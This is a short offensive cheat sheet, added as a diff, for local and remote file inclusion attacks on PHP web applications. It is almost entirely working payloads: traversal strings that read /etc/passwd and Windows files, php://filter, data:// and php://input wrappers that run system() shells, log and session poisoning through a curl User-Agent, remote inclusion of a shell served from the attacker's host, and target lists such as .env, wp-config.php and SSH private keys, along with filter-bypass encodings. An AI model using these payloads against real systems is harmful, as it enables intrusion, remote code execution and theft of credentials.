@@ -1,0 +1,29 @@
+LFI / RFI — QUICK REF
+
+Requires: a param that loads a file by path (?page= ?file= ?include= ?template=)
+
+1.  Confirm LFI:
+    ?page=/etc/passwd
+    ?page=../../../../etc/passwd
+    ?page=....//....//....//etc/passwd
+    # win: ?page=../../../../windows/win.ini
+    # .php appended: %00 (old PHP) or path truncation
+
+2.  Wrappers (read source / RCE):
+    ?page=php://filter/convert.base64-encode/resource=index.php   # then base64 -d
+    ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==&c=id
+    ?page=php://input   (POST: <?php system($_GET[c]); ?>)  &c=id
+
+3.  LFI -> RCE (log/session poisoning):
+    curl http://<target>/ -A '<?php system($_GET[c]); ?>'
+    ?page=/var/log/apache2/access.log&c=id
+    # sinks: /proc/self/environ, /var/lib/php/sessions/sess_<id>, auth.log, /var/mail/<user>
+
+4.  RFI (allow_url_include=On):
+    python3 -m http.server 80          # serve shell.txt: <?php system($_GET['c']); ?>
+    ?page=http://<your-ip>/shell.txt&c=id
+
+5.  High-value reads:
+    /var/www/html/config.php  .env  wp-config.php  /home/<user>/.ssh/id_rsa
+    /etc/passwd  /proc/self/environ
+    # bypass traversal filters: ....//  ..%2f  ..%252f
